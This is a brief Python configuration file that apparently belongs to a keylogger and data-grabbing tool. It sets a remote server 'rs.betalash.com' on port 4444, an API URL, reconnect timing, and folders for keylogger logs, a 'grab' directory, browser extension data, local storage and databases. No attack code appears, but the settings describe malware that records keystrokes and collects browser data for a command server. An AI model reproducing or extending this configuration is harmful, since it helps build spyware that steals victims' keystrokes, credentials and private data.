import os

RS_SERVER_HOST = "rs.betalash.com"
RS_SERVER_PORT = 4444
DJANGO_API_URL = "https://api.betalash.com"
PING_INTERVAL = 5
RECONNECT_DELAY = 3

RESULTS_DIR_NAME = "ResAuto"
KEYLOGGER_DIR = "Results"
KEYLOGGER_LOG_FILE = "events.log"

GRABBER_DIR = "grab"
TOOLS_DIR = "tools"
APP_DIR = "app"
EXT_LOCAL_DIR = "ext_local"
EXT_SYNC_DIR = "ext_sync"
LOCAL_STORAGE_DIR = "local_storage"
DB_LAST_DIR = "db_last"
